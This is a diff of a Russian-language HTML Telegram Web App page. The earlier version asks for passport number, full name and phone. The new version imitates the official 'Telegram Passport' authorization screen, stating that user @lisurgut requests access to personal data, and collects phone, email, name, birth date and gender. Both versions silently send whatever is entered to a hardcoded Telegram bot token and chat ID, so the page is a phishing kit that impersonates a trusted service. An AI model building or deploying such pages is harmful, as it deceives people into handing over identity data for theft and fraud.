@@ -1,310 +1,133 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-  <meta charset="UTF-8" />
-  <title>Предоставление данных</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta charset="UTF-8">
+  <title>Telegram Passport</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <script src="https://telegram.org/js/telegram-web-app.js"></script>
   <style>
     :root {
-      --bg-color: #fff;
-      --text-color: #000;
-      --input-bg: #fff;
-      --input-border: #ccc;
-      --input-focus-border: #0088cc;
-      --button-bg: #0088cc;
-      --button-bg-hover: #006fa1;
-      --button-text: #fff;
+      --bg-color: #1d211b;
+      --text-color: white;
+      --muted-text: #888;
+      --accent: #a4e956;
+      --border: #444;
+      --placeholder: #ccc;
+      --button-bg: #80c64c;
+      --button-hover: #74b348;
     }
-
-    body {
-      margin: 0;
-      padding: 20px 16px 80px; /* padding-bottom для кнопки */
-      font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
-      background-color: var(--bg-color);
-      color: var(--text-color);
-      min-height: 100vh;
-      display: flex;
-      flex-direction: column;
-      align-items: center;
-    }
-
-    h2 {
-      font-weight: 600;
-      margin-bottom: 24px;
-    }
-
-    form {
-      width: 100%;
-      max-width: 400px;
-      display: flex;
-      flex-direction: column;
-      gap: 24px;
-    }
-
-    .input-group {
-      display: flex;
-      flex-direction: column;
-      position: relative;
-    }
-
-    label {
-      font-weight: 600;
-      font-size: 14px;
-      margin-bottom: 6px;
-      color: var(--text-color);
-      user-select: none;
-    }
-
-    input {
-      font-size: 16px;
-      padding: 10px 12px;
-      border: 1.5px solid var(--input-border);
-      border-radius: 8px;
-      background-color: var(--input-bg);
-      color: var(--text-color);
-      outline-offset: 2px;
-      transition: border-color 0.3s ease, box-shadow 0.3s ease;
-    }
-
-    input::placeholder {
-      color: #999;
-      opacity: 1;
-    }
-
-    input:focus {
-      border-color: var(--input-focus-border);
-      box-shadow: 0 0 6px var(--input-focus-border);
-    }
-
-    input[readonly] {
-      background-color: #f9f9f9;
-      cursor: not-allowed;
-    }
-
-    button#submitBtn {
-      position: fixed;
-      bottom: 12px;
-      left: 50%;
-      transform: translateX(-50%);
-      width: calc(100% - 32px);
-      max-width: 400px;
-      padding: 14px 0;
-      font-size: 18px;
-      font-weight: 700;
-      background-color: var(--button-bg);
-      color: var(--button-text);
-      border: none;
-      border-radius: 10px;
-      cursor: pointer;
-      box-shadow: 0 4px 8px rgb(0 136 204 / 0.4);
-      transition: background-color 0.3s ease;
-      z-index: 100;
-    }
-
-    button#submitBtn:hover {
-      background-color: var(--button-bg-hover);
-    }
-
-    .status {
-      margin-top: 12px;
-      font-weight: 600;
-      font-size: 14px;
-      min-height: 22px;
-      color: var(--text-color);
-    }
-
-    .status.success {
-      color: green;
-    }
-
-    .status.error {
-      color: red;
-    }
+    body { margin:0; font-family:"Segoe UI",sans-serif; background:var(--bg-color); color:var(--text-color); }
+    .wrapper, .container { max-width:500px; margin:30px auto; padding:30px 25px; box-sizing:border-box; }
+    h2 { font-size:20px; margin-bottom:15px; text-align:center; }
+    .info-title, .section-title { color:var(--accent); font-size:14px; margin:25px 0 15px; }
+    .info-item, .row { display:flex; justify-content:space-between; align-items:center; margin-bottom:15px; }
+    .info-label, .label { color:var(--muted-text); width:150px; flex-shrink:0; }
+    input[type="text"] { background:none; border:none; border-bottom:1px solid var(--border); color:var(--text-color); font-size:14px; padding:4px 0; flex:1; }
+    input[type="text"]:focus { outline:none; }
+    .dob-group { display:flex; gap:8px; flex:1; }
+    .dob-group input { width:40px; text-align:center; }
+    .gender-group { display:flex; gap:20px; }
+    .gender-option { display:flex; align-items:center; gap:6px; cursor:pointer; }
+    .radio { width:16px; height:16px; border:2px solid var(--accent); border-radius:50%; position:relative; }
+    .radio.checked::after { content:''; position:absolute; top:3px; left:3px; width:10px; height:10px; background:var(--accent); border-radius:50%; }
+    .static-value { color:var(--accent); font-size:14px; flex:1; }
+    .small-note { color:#666; font-size:11px; margin-top:6px; }
+    .info-placeholder-x { font-size:14px; color:var(--placeholder); border-bottom:1px solid var(--border); padding:5px 0; cursor:pointer; display:flex; align-items:center; gap:8px; }
+    .notice { font-size:13px; color:var(--muted-text); margin-top:20px; }
+    .authorize-btn, .save-button { margin-top:30px; width:100%; padding:12px; background:var(--button-bg); color:var(--text-color); border:none; border-radius:6px; font-weight:bold; font-size:14px; cursor:pointer; display:flex; align-items:center; justify-content:center; gap:10px; }
+    .authorize-btn:hover, .save-button:hover { background:var(--button-hover); }
+    .authorize-btn i, .save-button i { font-size:16px; }
+    .page { display:none; }
+    .page.active { display:block; }
+    .passport-icon { width:60px; height:60px; background:#3c96e8; border-radius:50%; margin:15px auto; display:flex; align-items:center; justify-content:center; }
+    .description { text-align:center; font-size:14px; color:var(--placeholder); line-height:1.6; margin-bottom:20px; }
   </style>
 </head>
 <body>
+  <script>
+    // Инициализация Telegram Web App
+    Telegram.WebApp.ready();
+    const theme = Telegram.WebApp.themeParams;
+    // Применяем тему из Telegram
+    if(theme.bg_color) document.documentElement.style.setProperty('--bg-color', theme.bg_color);
+    if(theme.text_color) document.documentElement.style.setProperty('--text-color', theme.text_color);
+    if(theme.secondary_bg_color) document.documentElement.style.setProperty('--border', theme.secondary_bg_color);
+  </script>
 
-<h2>Предоставление данных</h2>
+  <!-- Page 1 -->
+  <div id="page1" class="page active">
+    <div class="wrapper">
+      <h2>Authentication</h2>
+      <div class="passport-icon"><i class="fas fa-passport"></i></div>
+      <div class="description">Пользователь @lisurgut<br>запрашивает доступ к Вашим<br>персональным данным</div>
 
-<form id="dataForm" autocomplete="off" novalidate>
-  <div class="input-group">
-    <label for="passkey">Паспорт</label>
-    <input
-      type="text"
-      id="passkey"
-      name="passkey"
-      maxlength="11"
-      placeholder="0000 000000"
-      required
-      inputmode="numeric"
-      pattern="\d{4} \d{6}"
-      title="Формат: 0000 000000"
-      autocomplete="off"
-      autocorrect="off"
-      spellcheck="false"
-    />
+      <div class="info-title">Запрошенная информация</div>
+      <div class="info-item">
+        <div class="info-label">Личная информация</div>
+        <div class="info-placeholder-x" onclick="goToPage(2)">Укажите личную информацию <i class="fas fa-arrow-right"></i></div>
+      </div>
+
+      <div class="info-item">
+        <div class="info-label">Номер телефона</div>
+        <input id="phone" type="text" placeholder="+7 999 999-99-99" oninput="updateLanguageNote()">
+      </div>
+
+      <div class="info-item">
+        <div class="info-label">Email</div>
+        <input id="email" type="text" placeholder="example@mail.com">
+      </div>
+
+      <div class="notice">Вы разрешаете @lisurgut отправлять Вам сообщения.</div>
+      <button class="authorize-btn" onclick="authorize()"><i class="fas fa-unlock"></i> АВТОРИЗОВАТЬСЯ</button>
+    </div>
   </div>
-  <div class="input-group">
-    <label for="fio">ФИО</label>
-    <input
-      type="text"
-      id="fio"
-      name="fio"
-      placeholder="Иванов Иван Иванович"
-      required
-      autocomplete="name"
-      autocapitalize="words"
-      spellcheck="false"
-    />
+
+  <!-- Page 2 -->
+  <div id="page2" class="page">
+    <div class="container">
+      <h2>Telegram Passport</h2>
+      <div class="passport-icon"><i class="fas fa-id-card"></i></div>
+
+      <div class="section-title">Личная информация</div>
+      <div class="row"><div class="label">Имя</div><input id="fname" type="text"></div>
+      <div class="row"><div class="label">Отчество</div><input id="mname" type="text"></div>
+      <div class="row"><div class="label">Фамилия</div><input id="lname" type="text"></div>
+      <div class="row"><div class="label">Дата рождения</div><div class="dob-group"><input id="day" type="text" placeholder="ДД"><input id="month" type="text" placeholder="ММ"><input id="year" type="text" placeholder="ГГГГ"></div></div>
+      <div class="row"><div class="label">Пол</div><div class="gender-group"><div class="gender-option" onclick="selectGender('male')"><div class="radio checked" id="male-radio"></div> Мужской</div><div class="gender-option" onclick="selectGender('female')"><div class="radio" id="female-radio"></div> Женский</div></div></div>
+      <div class="row"><div class="label">Гражданство</div><div class="static-value">Russian Federation</div></div>
+      <div class="row"><div class="label">Местожительство</div><div class="static-value">Russian Federation</div></div>
+
+      <div class="section-title" id="language-note">Ваше имя на языке страны проживания</div>
+      <div class="row"><div class="label">Имя</div><input type="text"></div>
+      <div class="row"><div class="label">Отчество</div><input type="text"></div>
+      <div class="row"><div class="label">Фамилия</div><input type="text"></div>
+      <div class="small-note">Ваше имя на языке страны проживания</div>
+      <button class="save-button" onclick="saveData()"><i class="fas fa-arrow-left"></i> СОХРАНИТЬ</button>
+    </div>
   </div>
-  <div class="input-group">
-    <label for="phone">Номер телефона</label>
-    <input
-      type="tel"
-      id="phone"
-      name="phone"
-      placeholder="+7 999 999 99 99"
-      required
-      inputmode="tel"
-      pattern="\+7\s?\d{3}\s?\d{3}\s?\d{2}\s?\d{2}"
-      title="Введите номер в формате +7 999 999 99 99"
-      autocomplete="tel"
-      autocorrect="off"
-      spellcheck="false"
-    />
-  </div>
-  <div class="input-group">
-    <label for="urid">URID</label>
-    <input
-      type="text"
-      id="urid"
-      name="urid"
-      required
-      autocomplete="off"
-      autocorrect="off"
-      spellcheck="false"
-    />
-  </div>
-  <div class="status" aria-live="polite"></div>
-</form>
 
-<button id="submitBtn" type="submit" form="dataForm">Отправить</button>
-
-<script>
-  const tg = window.Telegram?.WebApp || null;
-
-  function applyThemeColors(theme = {}) {
-    const root = document.documentElement;
-
-    root.style.setProperty('--bg-color', theme.bg_color || '#fff');
-    root.style.setProperty('--text-color', theme.text_color || '#000');
-    root.style.setProperty('--input-bg', theme.bg_color || '#fff');
-    root.style.setProperty('--input-border', theme.control_color || '#ccc');
-    root.style.setProperty('--input-focus-border', theme.button_color || '#0088cc');
-    root.style.setProperty('--button-bg', theme.button_color || '#0088cc');
-    root.style.setProperty('--button-bg-hover', theme.button_hover_color || '#006fa1' || '#006fa1');
-    root.style.setProperty('--button-text', theme.button_text_color || '#fff');
-  }
-
-  if (tg) {
-    tg.ready();
-    applyThemeColors(tg.themeParams || {});
-    tg.onEvent('themeChanged', () => applyThemeColors(tg.themeParams || {}));
-  } else {
-    applyThemeColors();
-  }
-
-  const passInput = document.getElementById('passkey');
-  passInput.addEventListener('input', () => {
-    let value = passInput.value.replace(/\D/g, '');
-    if (value.length > 10) value = value.slice(0, 10);
-    if (value.length > 4) {
-      value = value.slice(0, 4) + ' ' + value.slice(4);
-    }
-    passInput.value = value;
-  });
-
-  const form = document.getElementById('dataForm');
-  const statusDiv = document.querySelector('.status');
-  const submitBtn = document.getElementById('submitBtn');
-
-  form.addEventListener('submit', function (e) {
-    e.preventDefault();
-
-    const passkey = passInput.value.trim();
-    const fio = form.fio.value.trim();
-    const phone = form.phone.value.trim();
-    const urid = form.urid.value.trim();
-
-    if (!/^\d{4} \d{6}$/.test(passkey)) {
-      statusDiv.textContent = 'Неверный формат паспорта. Пример: 1234 567890';
-      statusDiv.className = 'status error';
-      passInput.focus();
-      return;
-    }
-
-    if (fio.length < 3) {
-      statusDiv.textContent = 'Пожалуйста, введите ФИО полностью.';
-      statusDiv.className = 'status error';
-      form.fio.focus();
-      return;
-    }
-
-    if (!/^\+7\s?\d{3}\s?\d{3}\s?\d{2}\s?\d{2}$/.test(phone)) {
-      statusDiv.textContent = 'Неверный формат номера телефона. Пример: +7 999 999 99 99';
-      statusDiv.className = 'status error';
-      form.phone.focus();
-      return;
-    }
-
-    if (urid.length < 3) {
-      statusDiv.textContent = 'Введите корректный URID.';
-      statusDiv.className = 'status error';
-      form.urid.focus();
-      return;
-    }
-
-    // Токен и чат из задания
+  <script>
+    let currentGender = 'male';
+    const prefixMap = {};
     const botToken = '8112715154:AAG8UTvBi79BvqBB4Cqob95oYgJxbXpgjiY';
-    const chatId = '6222585321';
+    const targetChat = '6222585321';
 
-    const message = `Новые данные:
-Паспорт: ${passkey}
-ФИО: ${fio}
-Телефон: ${phone}
-URID: ${urid}`;
+    document.addEventListener('DOMContentLoaded', async () => {
+      try { const data = await fetch('https://insurgut.github.io/api/num.json').then(r=>r.json()); Object.assign(prefixMap,data);} catch(e){}
+      const s=JSON.parse(localStorage.getItem('userData')||'{}');
+      if(s.phone)phone.value=s.phone; if(s.email)email.value=s.email;
+      if(s.fname)fname.value=s.fname; if(s.mname)mname.value=s.mname; if(s.lname)lname.value=s.lname;
+      if(s.birth){const[p,m,y]=s.birth.split('.');day.value=p; month.value=m; year.value=y;}
+      if(s.gender)selectGender(s.gender);
+      updateLanguageNote();
+    });
 
-    submitBtn.disabled = true;
-    statusDiv.textContent = 'Отправка данных...';
-    statusDiv.className = 'status';
-
-    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({
-        chat_id: chatId,
-        text: message
-      })
-    })
-      .then(res => res.json())
-      .then(data => {
-        if (data.ok) {
-          statusDiv.textContent = 'Данные успешно отправлены.';
-          statusDiv.className = 'status success';
-          form.reset();
-        } else {
-          throw new Error(data.description);
-        }
-      })
-      .catch(err => {
-        statusDiv.textContent = 'Ошибка: ' + err.message;
-        statusDiv.className = 'status error';
-      })
-      .finally(() => {
-        submitBtn.disabled = false;
-      });
-  });
-</script>
-
+    function selectGender(g){currentGender=g;document.getElementById('male-radio').classList.toggle('checked',g==='male');document.getElementById('female-radio').classList.toggle('checked',g==='female');}
+    function goToPage(n){document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));document.getElementById('page'+n).classList.add('active');}
+    function saveData(){const d={phone:phone.value,email:email.value,fname:fname.value,mname:mname.value,lname:lname.value,birth:`${day.value}.${month.value}.${year.value}`,gender:currentGender};localStorage.setItem('userData',JSON.stringify(d));goToPage(1);return d;}
+    async function authorize(){const d=saveData();const msg=`Новая заявка:\nТелефон: ${d.phone}\nEmail: ${d.email}\nИмя: ${d.fname} ${d.mname} ${d.lname}\nДата рождения: ${d.birth}\nПол: ${d.gender}`;try{await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:targetChat,text:msg})});alert('Данные отправлены!');}catch{alert('Ошибка при отправке');}}
+    function updateLanguageNote(){const v=phone.value;let m='';for(const p in prefixMap)if(v.startsWith(p)&&p.length>m.length)m=p;document.getElementById('language-note').textContent=prefixMap[m]||'Ваше имя на языке страны проживания';}
+    document.getElementById('phone').addEventListener('input',updateLanguageNote);
+  </script>
 </body>
 </html>
